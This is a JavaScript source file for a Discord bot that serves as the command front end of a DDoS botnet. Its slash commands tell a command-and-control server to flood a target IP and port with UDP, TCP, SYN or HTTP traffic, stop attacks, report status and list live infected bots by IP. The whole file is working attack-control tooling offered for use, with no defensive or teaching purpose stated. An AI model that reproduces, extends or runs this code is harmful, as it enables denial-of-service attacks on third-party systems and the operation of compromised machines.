// discord bot frontend for the c2 — slash commands launch attacks
// npm i discord.js dotenv

require('dotenv').config();
const {
  Client, GatewayIntentBits, Events, EmbedBuilder,
  SlashCommandBuilder, PermissionFlagsBits
} = require('discord.js');

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const C2_URL        = process.env.C2_URL || 'http://127.0.0.1:8080';
const OWNER_IDS     = new Set(
  (process.env.OWNER_IDS || '').split(',').map(s => s.trim()).filter(Boolean)
);

if (!DISCORD_TOKEN) { console.error('missing DISCORD_TOKEN'); process.exit(1); }

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const isOwner = (id) => OWNER_IDS.has(String(id));

async function c2Post(path, payload) {
  const r = await fetch(`${C2_URL}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload ?? {}),
  });
  return r.json();
}

async function c2Get(path) {
  const r = await fetch(`${C2_URL}${path}`);
  return r.json();
}

const commands = [
  new SlashCommandBuilder()
    .setName('attack')
    .setDescription('launch a ddos attack via the c2')
    .addStringOption(o => o.setName('method').setDescription('attack method')
      .setRequired(true)
      .addChoices(
        { name: 'udp',  value: 'udp'  },
        { name: 'http', value: 'http' },
        { name: 'tcp',  value: 'tcp'  },
        { name: 'syn',  value: 'syn'  },
      ))
    .addStringOption(o => o.setName('target').setDescription('target ip').setRequired(true))
    .addIntegerOption(o => o.setName('port').setDescription('target port').setRequired(true))
    .addIntegerOption(o => o.setName('duration').setDescription('seconds').setRequired(true))
    .addIntegerOption(o => o.setName('threads').setDescription('threads per bot').setRequired(false))
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  new SlashCommandBuilder()
    .setName('stop')
    .setDescription('stop the current attack')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  new SlashCommandBuilder()
    .setName('status')
    .setDescription('current attack status')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  new SlashCommandBuilder()
    .setName('bots')
    .setDescription('list live bots')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
].map(c => c.toJSON());

client.once(Events.ClientReady, async (c) => {
  console.log(`[+] logged in as ${c.user.tag}`);
  try {
    await client.application.commands.set(commands);
    console.log('[+] slash commands synced');
  } catch (e) {
    console.error('[-] command sync failed:', e.message);
  }
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (!isOwner(interaction.user.id)) {
    return interaction.reply({ content: 'not yours to use.', ephemeral: true });
  }

  const { commandName } = interaction;

  try {
    if (commandName === 'attack') {
      await interaction.deferReply();
      const method   = interaction.options.getString('method');
      const target   = interaction.options.getString('target');
      const port     = interaction.options.getInteger('port');
      const duration = interaction.options.getInteger('duration');
      const threads  = interaction.options.getInteger('threads') ?? 1;

      const res = await c2Post('/attack', { method, target, port, duration, threads });
      if (res.status !== 'started') {
        return interaction.editReply({ content: `c2 rejected: \`${JSON.stringify(res)}\`` });
      }

      let bots = 0;
      try { const live = await c2Get('/bots'); bots = Array.isArray(live) ? live.length : 0; } catch {}

      const embed = new EmbedBuilder()
        .setTitle('attack launched')
        .setColor(0xff3b3b)
        .addFields(
          { name: 'method',    value: `\`${method}\``,                    inline: true },
          { name: 'target',    value: `\`${target}:${port}\``,            inline: true },
          { name: 'duration',  value: `\`${duration}s\``,                 inline: true },
          { name: 'threads',   value: `\`${threads}\``,                   inline: true },
          { name: 'bots',      value: `\`${bots} live\``,                 inline: true },
          { name: 'attack id', value: `\`${String(res.attack_id).slice(0,12)}…\``, inline: true },
        );
      return interaction.editReply({ embeds: [embed] });
    }

    if (commandName === 'stop') {
      await interaction.deferReply();
      const res = await c2Post('/stop', {});
      return interaction.editReply({ content: `stopped. \`${res.status}\`` });
    }

    if (commandName === 'status') {
      await interaction.deferReply();
      const res = await c2Get('/status');
      if (!res.active) return interaction.editReply({ content: 'no active attack.' });
      const embed = new EmbedBuilder()
        .setTitle('attack in progress')
        .setColor(0xffa500)
        .addFields(
          { name: 'method', value: `\`${res.method}\``,             inline: true },
          { name: 'target', value: `\`${res.target}:${res.port}\``, inline: true },
        );
      return interaction.editReply({ embeds: [embed] });
    }

    if (commandName === 'bots') {
      await interaction.deferReply();
      const live = await c2Get('/bots');
      if (!Array.isArray(live) || live.length === 0) {
        return interaction.editReply({ content: 'no bots checked in.' });
      }
      const lines = live.slice(0, 20).map(b => `\`${b.id.slice(0,8)}\` — ${b.ip}`);
      const more  = live.length > 20 ? `\n…and ${live.length - 20} more` : '';
      const embed = new EmbedBuilder()
        .setTitle(`${live.length} live bots`)
        .setDescription(lines.join('\n') + more)
        .setColor(0x5865f2);
      return interaction.editReply({ embeds: [embed] });
    }
  } catch (e) {
    console.error(e);
    const msg = { content: `error: \`${e.message}\``, ephemeral: true };
    if (interaction.deferred || interaction.replied) return interaction.editReply(msg);
    return interaction.reply(msg);
  }
});

client.login(DISCORD_TOKEN);